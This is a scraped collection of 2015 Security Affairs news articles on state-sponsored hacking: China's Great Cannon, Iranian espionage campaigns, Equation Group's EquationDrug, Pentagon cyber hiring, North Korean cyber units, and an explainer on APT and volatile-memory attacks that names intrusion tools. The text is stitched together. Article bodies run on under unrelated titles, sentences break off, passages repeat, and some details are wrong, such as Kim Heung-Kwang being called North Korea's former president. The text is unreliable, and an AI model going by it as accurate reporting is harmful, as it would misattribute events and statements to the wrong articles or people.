"https://securityaffairs.co/wordpress/tag/fireeye", "topic_name": "FireEye"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/operation-russiandoll", "topic_name": "Operation RussianDoll"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pierluigi-paganini", "topic_name": "Pierluigi Paganini"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russian-hackers", "topic_name": "Russian hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/u-s-state-department", "topic_name": "U.S. State Department"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zero-day", "topic_name": "zero-Day"}]}, {"news_name": "Is the US cyber command ready for Information Warfare?", "news_link": "https://securityaffairs.co/wordpress/36034/cyber-warfare-2/us-cyber-command-abilities.html", "title": "Is the US cyber command ready for Information Warfare?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 16, 2015", "body": "The US are among the most advanced countries in Information Warfare, Obama administration considers strategic the dominance of the country in the cyber space.\n\nThe US Government established in 20o9 its military cyber command in order to defend the country from cyber attacks.

The Great Cannon has been used by Chinese authorities to knock-out two anti-censorship GitHub pages and it can be also used as a hacking tool to silently install malware on the targeted machine.\n\n\u201cWe show that, while the attack infrastructure is co-located with the Great Firewall, the attack was carried out by a separate offensive system, with different capabilities and design, that we term the \u201cGreat Cannon.\u201d  The Great Cannon is not simply an extension of the Great Firewall, but a distinct attack tool that hijacks traffic to (or presumably from) individual IP addresses, and can arbitrarily replace unencrypted content as a man-in-the-middle.\u201d states a report published by the team of researchers.\n\nThe traffic that hit the pages of anti-censorship service GreatFire.org and a mirror site of the New York Times Chinese edition appeared as originating from unaware individuals that visited websites that use analytics software developed by Chinese search engine Baidu.\n\nThe attackers used the Great Cannon to manipulate about one or two percent of the connections from people outside China by injecting a malicious JavaScript code into their traffic that caused their machines to repeatedly load the targeted GitHub pages.\n\n\u201cThe operational deployment of the Great Cannon represents a significant escalation in state-level information control: the normalization of widespread use of an attack tool to enforce censorship by weaponizing users,\u201d continues the report.\u201dSpecifically, the Cannon manipulates the traffic of \u2018bystander\u2019 systems outside China, silently programming their browsers to create a massive DDoS attack.\u201d\n\nThe experts revealed that the Great Cannon is the Chinese equivalent for the NSA\u2019s QUANTUM platform, which is able to infect any PC worldwide that visits China-based website not fully utilizing HTTPS.\n\n\n\nThe Great Cannon appears as a distinct entity respect the Great Firewall, it is an \u201cin-path\u201d barrier between two networks implemented into the Chinese backbone to perform man-in-the-middle attacks, meanwhile the Great Firewall is an \u201con-path\u201d system that sits off to the side for the purposes of eavesdropping on traffic passing between China and the rest of the world.\n\n\u201cOn-pathsystems have architectural advantages for censorship, but are less flexible and stealthy than in-path systems as attack tools, because while they can inject additional packets, they cannot prevent in-flight packets (packets that have already been sent) from reaching their destination. Thus, one generally can identify the presence of an on-path system by observing anomalies resulting from the presence of both injected and legitimate traffic.\u201d\n\n\n\nHow to protect websites from the Great Cannon?\n\nThe experts explained that encrypted HTTPS connections could make ineffective the powerful tool, because they could not me modified by attackers attempting to run MITM attacks.\n\nUnfortunately, websites that mix encrypted traffic with unencrypted traffic from third-party sites could be hacked by manipulating the traffic of one of the third parties.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  MITM, Great Cannon)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/great-cannon", "topic_name": "Great Cannon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/great-firewall", "topic_name": "great firewall"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/man-in-the-middle", "topic_name": "man-in-the-middle"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mitm", "topic_name": "MITM"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/quantum", "topic_name": "Quantum"}]}, {"news_name": "How Russians hackers breached the White House unclassified network", "news_link": "https://securityaffairs.co/wordpress/35795/cyber-crime/russians-hacked-whitehouse.html", "title": "How Russians hackers breached the White House unclassified network\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 8, 2015", "body": "On October 2014, the Reuters Agency published the news that a suspicious activity had been detected on the Executive Office of the President (EOP) network.

I suggest you to give a look to the report released by experts at Small Media. Vowing to ramp up the country\u2019s cyber capabilities, Rouhani has given the Islamic Revolutionary Guard Corps (IRGC) an annual cybersecurity budget of roughly $19.8 million.\n\n\u201cVowing to ramp up the country\u2019s cyber capabilities, Rouhani has given the Islamic Revolutionary Guard Corps (IRGC) an annual cybersecurity budget of roughly $19.8 million.\u201d states the Business Insider.\n\n\n\nIran is training a new generation of cyber soldiers, According to a report released in 2013 by the Middle East Media Research Institute, by November 2010, the Basij Cyber Council had trained 1,500 cyber-warriors who, according to IRGC commander Hossein Hamedani, \u201chave assumed their duties and will in the future carry out many operations.\u201d\n\nAccording to the Business Insider, experts have assisted to an escalation of the Iranian Investment after the discovery of the Stuxnet virus, a cyber weapon designed to cause serious damage to Iranian nuclear program.\n\nBy analyzing the problem in the future perspective, I personally consider more dangerous the Iranian cyber capabilities than its nuclear program. Cyber weapons could be destructive exactly like conventional weapons by their use presents numerous advantage, first of all the difficult attribution in the case of attack.\n\nAnother element of concern of the Iranian cyber growth is the alleged support received by the Russia, a country considered one of the most active in the Information Warfare.\n\n\u201cRussia has probably helped Iran a lot in stepping up its cyber capabilities in the event of a conflict with NATO,\u201d Kennedy said. \u201cIf they [the Iranians] want to topple the US\u2019 financial sector, or cripple the military\u2019s ability to communicate, they can do that.\u201d cybersecurity expert David Kennedy, founder of information security firm TrustedSec, told to the Business Insider.\n\nA fundamental distinction between hacking campaign run by Iranian state-sponsored hackers and their Chinese and Russian peers, it that Iran cyber units mainly operated to sabotage and destroy targets, while Russia and Chiana are more focused in cyber espionage motivated by competitive advantage or monetary gain.\n\nExactly like Chinese Government, also the Iranian authorities sustain programs to bring young people to the doctrine of hacking. The cyber security expert Jeff Bardin, of the greatest experts in cyber-jihad and with deep knowledge of the military operations conducted by states in the Middle East, told to the Business insider that Iran promote hacking culture through its top technological university.\n\n\u201cAt the Sharif University of Technology, which is like the MIT of Iran, students are participating in cyber \u2018capture-the-flag\u2019 games to hone their hacking skills,\u201d said Jeff Bardin, chief intelligence officer of cyber intelligence firm Treadstone 71. \u201cThey compete to see who can find security holes and break through servers\u2019 encryptions and firewalls the fastest.\u201d\n\n\u201cIt\u2019s all highly institutionalized,\u201d Bardin said. \u201cThe irony is that, after looking at some of the professors\u2019 resumes, you\u2019ll see that most of these cyber experts teaching students how to hack were initially trained in the US or UK.\u201d\n\nThe Government of Teheran also offers students internships with popular Iranian hacker groups, sustaining their participation in the programs of national cyber defense.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Iran,  Information Warfare)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-warfare", "topic_name": "Information Warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}]}, {"news_name": "ISIS cell calls on supporters to kill 100 US military personnel", "news_link": "https://securityaffairs.co/wordpress/35203/hacking/isis-cell-calls-on-supporters-to-kill-100-us-military-personnel.html", "title": "ISIS cell calls on supporters to kill 100 US military personnel\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 23, 2015", "body": "The ISIS continues to scare the West, its operations are supported by a very aggressive media campaign that shares proclamations and recruit new followers in the name of Jihad.

The attackers run a spear phishing campaign that was dubbed by the experts Operation Woolen Goldfish.\n\n\u201cThe first of these campaigns has already been exposed at 31C3 by Tillman Werner and Gadi Evron. That campaign started with traditional spear phishing e-mails that use basic social engineering techniques to entice the targeted users to open a Microsoft Office file.\u201d states the report published by Trend Micro.\n\nTrend Micro researchers speculate that the threat actors behind the Operation Woolen Goldfish are linked with another espionage campaign dubbed the \u201cRocket Kitten\u201d that was spotted in December 2014.\n\n\u201cRocket Kitten refers to a cyber threat group that has been hitting different public and private Israeli/European organizations. It has launched two campaigns so far: a malware campaign that exclusively makes use of GHOLE malware, as well as a targeted attack dubbed as \u201cOperation Woolen-GoldFish\u201d that\u2019s possibly state-sponsored.\u201d states Trend Micro.\n\nRocket Kitten campaign presented a number of similarities with this last wave of cyber attacks, also in that case the attack chain started with a spear phishing campaign, the messages were crafted to lure victims into open malicious Office files loaded with a \u201cGhole\u201d malware.\n\n\n\nThe attacks reported to the experts at Trend Micro were characterized by indicators of a specific malware family.\n\n\u201cThe alert showed an infected Microsoft Excel file that soon proved to have been launched by Rocket Kitten.\u201d\n\nRespect The Rotten Kitten, the Woolen Goldfish campaign appears far more sophisticated.\n\n\u201cBy the end of 2014 we saw significant changes in the attack behavior of the Rocket Kitten group in terms of spear-phishing campaigns and malware infection schemes,\u201d states the paper.\n\nBoth campaigns exploit the GHOLE malware, but in the Operation Woolen Goldfish the spear-phishing messages embedded with a malicious link that leads to a malicious file stored on OneDrive cloud storage.\n\nGHOLE isn\u2019t the unique variant of malware used by attackers, recently the experts discovered samples of a keylogger known as the CWoolger keylogger.\n\n\u201cThe attackers used a OneDrive link in their campaign. OneDrive is a free online cloud storage system from Microsoft that comes with several gigabytes of data storage capacity,\u201d explained the report.\n\n\u201cOnce executed, the file drops a non-malicious PowerPoint file used as a decoy file, while silently infecting the system with a variant of the CWoolger keylogger.\u201d\n\nResearchers at Trend Micro discovered that the CWoolger keylogger was developed by a hacking crew named \u201cWool3n.H4t\u201d, which is believed to have been involved in the Rocket Kitten attacks.\n\n\u201cConsistent with the other malware used by the threat actors involved in Operation Woolen Goldfish, the command and control reference is hard-coded as an IP address in the binary,\u201d reports the paper.\n\n\u201cA domain name was not used. Moreover, it lands on the system with a name, which is very similar to some Ghole malware variants [used by Rocket Kitten].\u201d\n\nExperts speculate that the attackers are still operating and it is likely that they are running a new campaign using new hacking tools.\n\n\u201cFrom our findings we can definitely say that threat actor team is alive and active,\u201d state the experts.\u201d With all the evidence, Rocket Kitten\u2019s attacks can be construed as politically-motivated, as the targeted entities do share a particular interest in the Islamic Republic of Iran. While motives behind targeted attack campaigns differ, the end results are one and the same: shift in power control either in the economically or politically.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Operation Woolen Goldfish, APT)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ghole", "topic_name": "Ghole"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/operation-woolen-goldfish", "topic_name": "Operation Woolen Goldfish"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rocket-kitten", "topic_name": "Rocket Kitten"}]}, {"news_name": "China and its cyber capabilities, are you really surprised?", "news_link": "https://securityaffairs.co/wordpress/35125/cyber-warfare-2/china-cyber-capabilities.html", "title": "China and its cyber capabilities, are you really surprised?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 20, 2015", "body": "Bill Hagestad (Red-DragonRising  @RedDragon1949) is a consultant, speaker and expert on Chinese cyber warfare.

of Military Strategy\u201d,  China reveals that has capabilities and explicitly refers a \u201cspecialized units devoted to wage war on computer networks.\u201d\n\nThe expert Joe McReynolds told to the TheDailyBeast that this it\u2019s a judge change in China posture respect the past:\n\n\u201che first time they\u2019ve come out and said, \u2018Yes, we do in fact have network attack forces, and we have teams on both the military and civilian-government sides,\u2019\u201d reports McReynolds .\n\nThe document also confirms the existence of internal law enforcement and intelligence agencies, the China\u2019s equivalents of the CIA and the FBI.\n\nOf course the public admission of the cyber army made by the government has political and diplomatic implications on the relationship with other governments, in particular with the United States.\n\n\u201cIt means that the Chinese have discarded their fig leaf of quasi-plausible deniability,\u201d McReynolds said. \u201cAs recently as 2013, official PLA [People\u2019s Liberation Army] publications have issued blanket denials such as, \u2018The Chinese military has never supported any hacker attack or hacking activities.\u2019 They can\u2019t make that claim anymore.\u201d\n\nMcReynolds said that China divided its Cyber army in 3 sub-groups:\n\nAll the above groups are engaged in hacking campaign, security speculate their involvement in cyber espionage operations operated against private companies to steal intellectual property and sensitive data.\n\n\u201cIt means that the Chinese have discarded their fig leaf of quasi-plausible deniability,\u201d McReynolds said. \u201cAs recently as 2013, official PLA [People\u2019s Liberation Army] publications have issued blanket denials such as, \u2018The Chinese military

acknowledging that the [ministry] has network warfare forces stationed within it, the United States and other targets of Chinese state-sponsored hacking will have to weigh carefully whether cooperation with the MPS on cybercrime is worth the risks,\u201d\n\nChina in only one of the country with a dedicated cyber unit, Russia, North Korea, Iran, and of course, the US have also high sophisticated information warfare capabilities.\n\nEvery country aims to impose a dominance on the cyberspace that is a strategic domain for warfare, security experts believe that a major cyber attack as act of war will happen soon.\n\nI contacted Bill Hagestad II, one of the most important Internationally cyber-intelligence & counter-intelligence professional, for a comment:\n\n\u201cThe news is nothing new\u2026albeit great that Chinese Hacking & the PLA is making the headlines, it is mere sensationalism and self-promotion \u2013 not really contributing anything new to the study of Chinese Military Cyber Doctrine Development.\u201d Hagestad said. \u201cTheories about Chinese military use of computers as a weapon system began some would argue with Major General Wang Pu Feng in

According to the researchers at Kaspersky Lab, on seven exploits used by the Equation Group in their malware and exploit kit, at least four of them were used as zero-days. For example, the experts mentioned a malicious code dubbed Fanny, which was used by the Equation Group in 2008 when it exploited two zero-days, later introduced into the Stuxnet variants detected in June 2009 and March 2010. This is proof that the hacking team had access to previously unknown flaws before any other group of hackers.\u201d I wrote in a comparative analysis between hacking tools developed by the Equation Group and NSA Tao unit.\n\nResearchers at Kaspersky Lab are still investigating on this APT and released a new deeper analysis of the older attack platform used by the Equation group.\n\nLet\u2019s start with the consideration that bad actor behind the Equation Group has developed a complete hacking platform, dubbed EquationDrug, that\u2019s able to produce selective agents to target specific platforms, process manipulation of targets, drivers and library loading and traffic hijacking.\n\n\n\nThe EquationDrug is the predecessor of another powerful hacking platform used by the Equation Group, the GrayFish. It cannot be used for OS after the Windows XP/2003.\n\nThe experts discovered that EquationDrug allowed the deployment at least of 116 different modules that implements sophisticated cyberespionage functions ranging from data exfiltration to target monitoring. Kaspersky experts analyzed 30 different modules, among the capabilities implemented by the EquationDrug there were system-level functions, data exfiltration modules for specific targets,\n\n\u201cThe architecture of the whole framework resembles a mini-operating system with kernel-mode and user-mode components carefully interacting with each other via a custom message-passing interface. The platform includes a set of drivers, a platform core (orchestrator) and a number of plugins,\u201d Kaspersky researchers wrote in a report. \u201cEvery plugin has a unique ID and version number that defines a set of functions it can provide. Some of the plugins depend on others and might not work unless dependencies are resolved.\u201d\n\nThe experts at Kaspersky Lab analyzed code artifacts and timestamps related to the EquationDrug, they speculate that coders are native English speakers that worked a Monday through Friday 9-5 work week in the UTC-3 or UTC-4 time zone.\n\nThe report includes the technical analysis for the 30 modules of the EquationDrug platform, you cannot miss it.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Equation Group, EquationDrug)\n\n", "topics": ""}, {"news_name": "Pentagon plans to hire 3,000 Cyber pros for the US Cyber Command", "news_link": "https://securityaffairs.co/wordpress/34684/cyber-warfare-2/pentagon-3000-experts-cyber-command.html", "title": "Pentagon plans to hire 3,000 Cyber pros for the US Cyber Command\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 11, 2015", "body": "Information warfare is strategic for almost every government, North Korea, Russia, China, Danmark are among the countries that are more investing to improve their cyber capabilities, and of course, the Five Eyes.\n\nThe US Department of Defense announced that it plans to hire 3,000 cyber experts that will support the US Cyber Command, the new units will be added by the end of 2015, doubling its resources by 2016.\n\n\n\nThe Defenseone.com also revealed further information on the new hires, for example the salaries start at $42,399 and can rise up to $132,122 depending on the capabilities of the candidate, which have to demonstrate their specific skills and knowledge.\n\nOn 23 June 2009, the Secretary of Defense directed the Commander of U.S. Strategic Command (USSTRATCOM) to establish USCYBERCOM that reached full operational capability on 31 October 2010 when the command assumed responsibility for several existing organizations.\n\nThe United States Cyber Command (USCYBERCOM) is an armed force subordinate to United States Strategic Command (USSTRATCOM) that is one of nine Unified Combatant Commands of the US Department of Defense.

This campaign was operated for the disruption of Iran\u2019s nuclear program in order to avoid Israeli strikes on Iran using conventional weapons.\n\nA NSA\u2019s document leaked by Snowden confirms the digital arm race of the US that aim to \u201cdominate\u201d the fifth element of warfare, the cyberspace.\n\nA newly disclosed secret report illustrates the tightening of cyber dispute between the United States and Iran , both for spying and sabotage. The document was written in April 2013 for Gen. Keith B. Alexander, director of the National Security Agency, and described how the Iranian Government discovered US plans to hit Iranian networks.\n\nCyberspace is a new strategic war field and even if the diplomacy is trying to focus attention on nuclear weapons, it is principal battlefield for many ongoing disputes:\n\n\u201cIran\u2019s destructive cyber attack against Saudi Aramco in August 2012, during which data was destroyed on tens of thousands of computers, was the first such attack NSA has observed from this adversary. Iran, having been a victim of a similar cyber attack against its own oil industry in April 2012, has demonstrated a clear ability to learn from the capabilities and actions of others.\u201d\n\nThe document reports about the Shamoon virus, which was used by the hacking crew called \u201cThe Cutting Sword of Justice\u201d to infect systems at Saudi Aramco. Intelligence experts believe the hacking team comes from Iran and is backed by Government of Teheran. It also addresses another state-sponsored attack, the one conducted with the Flame malware. Flame was used to compromise computers especially in Middle East. This worm hit a huge number of Iranian computers especially in the Iranian Oil Ministry, as well as others. Flame compromised private organizations and government entities in many countries such as Sudan, Syria, Egypt, and Saudi Arabia. As a nuclear bomb, it strikes not only the target but also civilians and all that is near the target.\n\n\n\n \u201cIran continues to conduct  distributed denial-of-service (DDOS) attacks against numerous U.S. financial institutions, and is currently in the third phase of a series of such attacks that began in August 2012. SIGINT indicates that these attacks are in retaliation to Western activities against Iran\u2019s nuclear sector and that senior officials in the Iranian government are aware of these attacks.\u201d continues the document.\n\nIt refers to the DDoS attacks that hit systems at JP Morgan Chase and the Bank of America, which flooded their websites causing an interruption of service for their customers.\n\nThe NSA document is clear about who attacked Saudi Aramco, but does not identify who created the Flame worm. On 19th June 2012, the Washington Post wrote that the Flame attack was carried out under the coordination of US and Israel. The day after the Washington Post article was published, Israel\u2019s Ministry of Finance, Defense, Police, the main Intelligence Service, and the Prime Minister\u2019s sites were unavailable.\n\nOn 21st June 2012, Iran\u2019s Intelligence Minister Heydar Moslehi said:\n\n\u201cBased on obtained information, America and the Zionist regime (Israel) along with the MI6 planned an operation to launch a massive cyber attack against Iran\u2019s facilities following the meeting between Iran and the P5+1 in Moscow.\u201d declared the Iran\u2019s Intelligence Minister Heydar Moslehi on 21st June 2012.\n\nIn my opinion, he refers to the Central Bank of Iran attack that occurred suddenly after the failure of negotiation between Iran and Moscow on country\u2019s nuclear program the 19th of June. Just a month later, the \u201cCyber Warriors Team\u201d from Iran compromised the SSL certificate of NSA.\n\nAgain, the NSA documents that were disclosed online, revealed the collaboration between UK, Israel and USA:\n\n\u201cEmphasize that we have successfully worked multiple high-priority surges with GCHQ that have allowed us to refine maintaining mission continuity and seamless transition, and maximize our target coverage. \u201d \n\nTo be more specific:\n\n\u201cThe respective NSA-ISNU and GCHQ-ISNU bilateral relationships had gotten to the point that each participant recognized the need for the trilateral engagement to advance this specific topic. \u201d\n\nIt\u2019s clear that cyberspace is a battlefield for almost every country. The actions taken are clear and also the Disarmament and International Security committee (DISEC) detailed in its Background Guide (SurreyMUN 2015) two kinds of operations operated in information warfare context: espionage and sabotage.\n\nReferring to Sabotage it states:\n\n\u201cbut just remember it means \u201cdo something\u201d whereas espionage here means \u201clearn something\u201d. \n\nThe DISEC guide reported all the major cyber attacks from 2007 till 2013, including the DDoS on Estonia that took down banks, newspapers and governments websites, a planned attack the Israel\u2019s Internet Infrastructure in 2009, the Stuxnet worm in 2010, the Red October in 2012, and the most recent NSA leak in 2013.  We can  easily remember the last actions made by the Cyber Caliphate on twitter accounts of  Albuquerque Journal and other minor attacks made in the name of Jihad or Islam around the globe, or the major attack on Sony which could have involved North Korea.\n\nAs we can read in INSS-CSFI report of 15th February 2015, as a consequence of all the actions on cyberspace, made for offensive or defensive purposes, all the most important countries involved in those scenarios are organizing a team or a specific Bureau for cyber defence:\n\n\u201cIsrael National Cyber Bureau (INCB), which will continue setting national policy, in building a pioneering technological force for the State of Israel as a global leader in the cyber field \u201d. \n\nThe  report notes that the USA is building a new agency that will drive all cyber warfare actions, leading actual agency such as FBI, CIA, NSA, DHS and military cyber commands.  Even the UK is building the 77th brigade that will operate against Islamist propaganda like ISIS. Last, but no less interesting, is that Der Spiegel said that Russia\u2019s new military doctrine, signed at the end of 2014, declared that a cyber hazard will be qualified such as a military hazard.\n\nWhy buy a weapon when I have a keyboard?   \n\nWritten by Alessandro Contini\n\nAlessandro Contini operates as Cyber Security Consultant in national and international realities.

According to the statements of a former president of North Korea, Kim Heung-Kwang, there is great interest on behalf of the Korean security gladiators (the cyber warriors) towards penetrating the systems of Western Governments and harming their infrastructure to the bone. Kim Heung-Kwang is also the founder of the organization called \u201cNorth Korea Intellectuals Solidarity\u201d, which aims to raise awareness and inform people of the malicious intent of North Korea. However, the interests of Heung-Kwang\u2019s home country are not limited to governmental sources; instead, they also include sources from the private sector and they can harm the Internet to a huge extent.\n\n\n\nTargeting nuclear power businesses and transportation, as well as organizations handling public utilities, the hacking results of North Korea can lead to grave negative consequences in the near future. Given the fact that the cyber warriors in this country are sophisticated and particularly devoted to what they do, the concern becomes even bigger and more direct. According to what the professor who had been working in North Korea\u2019s Hamhung University of Computer Technology had told Reuters in December:\n\n\u201cNorth Korea\u2019s ultimate goal in cyber strategy is to be able to attack national infrastructure of South Korea and the United States\u201d.\n\nAnother thing that is worth highlighting about the interview given by Kim Heung-Kwang is the striking resemblance of the tactics used by the North Koreans and the recent attacks to Sony:\n\n\u201cThe hacking of Sony Pictures is similar to previous attacks that were blamed on North Korea and is a result of training and efforts made with the goal of destroying infrastructure.\u201d\n\nThe shocking story of Kim Heung-Kwang includes his arrest for holding illegal films and his transfer to labor camps. He managed to escape from the camps, after giving money to a guard of the borders and after having spent about a year under horrible conditions. He later swam across Tumen River and reached China, before settling to South Korea and residing there till now.\n\n\u201cThey have trained themselves by launching attacks related to electronic networks\u201d, Jang Se-yul commented on the skills and sophistication of North Korea. Jang Se-yul is another expert in computer science having studied at the military college before leaving North Korea and escaping to the South. \u201cThe ultimate target that they have been aiming at for long is infrastructure\u201d, he reveals as to the ultimate goal of these cyber attacks.\n\nThe NSA has found evidence about the correlation of the North Koreans with the recent attacks launched against Sony, as well as other similar attacks. Based on the testaments of people who have worked in this field and have learned everything within North Korea, most of the attacks are launched within China by the notorious \u201cBureau 121\u201d,  which is the group of hackers working under the direction of the General Bureau of Reconnaissance.\n\nWritten by: Ali Qamar, Founder/Chief Editor at SecurityGladiators.com\n\nAuthor Bio:\nAli Qamar is an Internet security research enthusiast who enjoys \u201cdeep\u201d research to dig out modern discoveries in the security industry.

AVT is an attack in volatile memory that wipes its \u2018fingerprints\u2019 before leaving and after it has stolen your intellectual property\u201d\n\n Advanced Persistent Threats (APT)\n\nAPTs (aka Advanced Persistent Attacks) are designed to gain access to a network, acquire data and secretly monitor the targeted computer systems over long periods of time. Many researchers agree that the term \u201cAdvanced Persistent Threat\u201d was first coined by the U.S. Government during 2005 by Security Analysts to describe complex cyber attacks against specific targets for financial or informational gains by a well-funded group of individuals.\n\nThe \u201cAdvanced\u201d process signifies sophisticated techniques using malware and known vulnerabilities to exploit the internal systems. The \u201cPersistent\u201d process suggests that an external command and control system is continuously monitoring and extracting data from a specific target. The \u201cThreat\u201d process indicates human involvement in orchestrating the attack.\n\nThe Stuxnet computer worm, which targeted the computer hardware of Iran\u2019s nuclear program, is one example. In this case, the Iranian government might consider the Stuxnet creators to be an advanced persistent threat.\n\nAdvanced Volatile Threat (AVT)\n\nAVTs are a stealthier attack vector when compared with the APTs. Many experts predict that AVTs may cause a huge damage by sophisticated nation-state for cyber espionage. Security Vendor Triumfant, president and CEO John Prisco says \u201cIt is an attack in volatile memory that wipes its \u2018fingerprints\u2019 before leaving and after it has stolen your intellectual property. An AVT comes in, exfiltrates the data it\u2019s looking for and then immediately wipes its \u2018hands\u2019 clean leaving no trace behind as the computer is shut down\u201d\n\n \n\nKevin McAleavey, cofounder and chief architect of the KNOS Project, called AVT a redefinition of the well-known term, memory resident virus. \u201cThe first memory resident virus was known as Lehigh, which made the rounds in 1987,\u201d he said. McAleavey agreed that malware that is not persistent is tricky to spot.\n\n\u201cTraditional antivirus solutions depend on the presence of a file existing \u2013 that\u2019s what they detect and look for, attempting to intervene in the completion of that file being loaded into memory and run as a program,\u201d he said. \u201cNo file, no detection.\u201d\n\nHow different is APTs and AVTs? \n\nAPTs are persistent or disk-resident and AVTs are volatile or RAM-only. Though AVTs has not emerged as a new cyber threat, they have been present in form of malware for a long time. They can be deployed through a drive-by download and exist only in RAM memory. In this sense they are real-time attacks. AVTs are not persistent in that they disappear without a trace as soon as the PC is turned off, or as soon as they stop running, whichever occurs first. On the other hand, APT attacks persist in memory for a very long period until the attacker steals all the required information from the network. AVTs are almost the exact opposite of APTs which are designed to be low and slow and persist in the network for a very long duration. But AVTs are limited to part of one day in most cases.\n\nBreaking down the APT\n\nThe Attacker group can include Intelligence agencies, criminal groups, activist groups and armed forces. They initiate an APT attack and waits patiently searching for security weaknesses and loopholes within the infrastructure of the target organization. Rather than impairing the system, the attacker hides within it and simply engages in stealth data collection.\n\nThe lifecycle of APTs can be classified into : Information gathering, Initial Exploitation, Command and Control, Privilege Escalation and Data Exfiltration.\n\nThe attackers perform research on threat entry points, key individuals and their responsibilities, key assets and clients of the targeted organization through easily available public data on social networks.\n\n\n\nComplex \u2013 APTs apply a complex mix of attack methods targeting multiple vulnerabilities identified within the organization. It may involve identifying key individuals of the target organization and apply multiple techniques as listed below:\n\nSlow Infect \u2013 Essentially APT try to stay invisible for as long as possible to avoid any detection by following the rule of \u201clow and slow\u201d. Once the foothold is established in the targeted environment, the attacker remotely controls infected hosts with a command-and-control service which is seamlessly installed in the victim\u2019s system replacing a legitimate application software with a compromised components that includes additional functionality for the command and control requirements.\n\nDiscover, Control and Persist \u2013 The APTs now starts to gather information about computers, servers or storage holding the information they have been instructed to steal. They perform this by using the tools available in the compromised computers. Their next step would definitely involve lateral movement to new systems to explore their content and recursively learn about gaining access to other systems.now starts to gather information about computers, servers or storage holding the information they have been instructed to steal.

They perform this by using the tools available in the compromised computers. Their next step would definitely involve lateral movement to new systems to explore their content and recursively learn about gaining access to other systems.\n\nOnce the attacker moves around the network using the compromised credentials of the first few target machines, they try to get privilege escalation from local user to administrator in the systems. The tools used to gain more control are gsecdump, SSH, RDP, Cain&Abel (crack password). Key targets may include administrator in the systems.

The tools used to gain more control are gsecdump, SSH, RDP, Cain&Abel (crack password). Key targets may include Active Directory (AD) and Certificate PKI servers to establish accounts and gain access privileges to confidential data within the network.\n\nExtract and Take Action \u2013 After discovering the data of interest, the APT generally gather the data into an archive and then compress and encrypt the archive. This enables them to hide the content of the archive from deep packet inspection and data loss prevention techniques. The next step involves the exfiltration of the data from the victims system. APTs usually take advantage of FTP services which are left running or use custom data transfer techniques if FTP is disabled. What makes APT attacks different from any other cyber Attacks is the scope, as they exploit vulnerabilities not to disrupt or shutdown systems but to collect sensitive data.victims system.

What makes APT attacks different from any other cyber Attacks is the scope, as they exploit vulnerabilities not to disrupt or shutdown systems but to collect sensitive data.\n\nThe APT then persists within the network, to get unnoticed. It is also designed to persist by calling back the command and control centers for updates to download new undetected code to avoid detection by updated antivirus solutions.\n\nIf new target data continues to become available (new customer records or updated business plans) and holds value for the attacker, this extraction phase continues for a longer duration.\n\nEventually, the attack will stop, either because the attacker has achieved their goal or because the victim notices and cuts off the attack. Once the APT steals the data, they then perform multiple criminal activities like\n\nMost popular APT methods are botnet or malware like Regin, Flame, Duqu, and the popular Stuxnet. These cyber attacks bypass the traditional signature based tools and common sandboxes.\n\nIn the other hand, AVT is one of the techniques malware uses to avoid analysis. Most experts believe that AVTs are having a far greater likelihood of remaining undetected, thus protecting the identity of the attacker. Most commonly a Meterpreter (The Meta-Interpreter) is used to launch an AVT. It is a simple-to-use exploitation tool included as part of the Metasploit Framework. It allows developers to write their own dll file that can be injected into a running process on the target computer. As conventional AV file scanning methods will not identify AVTs, RAM-monitoring techniques will be required to detect an AVT attack in real-time.\n\nEdited by Pierluigi Paganini\n\n(Security Affairs \u2013  APT, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/advanced-persistent-threats", "topic_name": "advanced persistent threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, 